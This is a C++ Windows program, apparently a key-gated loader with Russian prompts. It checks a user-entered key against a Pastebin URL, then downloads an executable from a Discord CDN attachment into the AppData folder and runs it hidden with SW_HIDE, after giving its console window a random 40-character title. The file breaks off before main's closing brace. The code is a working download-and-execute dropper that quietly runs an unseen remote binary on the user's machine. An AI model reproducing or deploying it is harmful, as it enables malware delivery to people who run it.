#define _CRT_SECURE_NO_WARNINGS
#include "includes.h"
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>


bool checkinternet;
HANDLE hProc;
HRESULT result;
string key;

static const char rnum[] = "0123456789" "qwertyuiopasdfghjklzxcvbnm" "QWERTYUIOPASDFGHJKLZXCVBNM";
int staticLength = sizeof(rnum) - 1;
std::string RandomTitle;

char GetRandom() {
    return rnum[rand() % staticLength];
}

void SetRandomTitle() {

    srand(time(0));
    for (unsigned int i = 0; i < 40; ++i) {

        RandomTitle += GetRandom();
    }

    SetConsoleTitle(RandomTitle.c_str());
}

string bussdown = ("https://cdn.discordapp.com/attachments/952991044008554576/991655723547234354/1144.exe");
string query = ("https://pastebin.com/raw/15EkCDEu");
string appdata = getenv("APPDATA");

string replaceAll(string subject, const string& search, const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}
string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}

int main() {
    setlocale(LC_ALL, ("Russian"));
    SetRandomTitle(); 


#ifdef DEBUG
    string test = encrip("");
    cout << test;
    _getch();
#endif

    cout << ("\n\n Введите Ключ: ");
    cin >> key;
    (key);
    system("cls");

    
    cout << "\n\n Проверяем твой ключ ";
    Sleep(1400);
    system("cls");

    if ((key) != DownloadString(query)) {

        cout << ("\n\n Ваша ключ не был обнаружен") << endl;
        Sleep(2000);
        exit(-1);

    }


    appdata += "\\1144.exe"; 
    cout << "Наш файл будет находиться по пути: " + appdata << endl;
    cout << "Идет скачка файла \n";
    HRESULT hr = URLDownloadToFileA(NULL, bussdown.c_str(), appdata.c_str(), 0, 0); 

    if (hr == S_OK) 
    {
        cout << "Файл успешно скачан, открываем его\n";
        ShellExecuteA(NULL, "open", appdata.c_str(), NULL, NULL, SW_HIDE); 
    }

    Sleep(1800);



    return 0;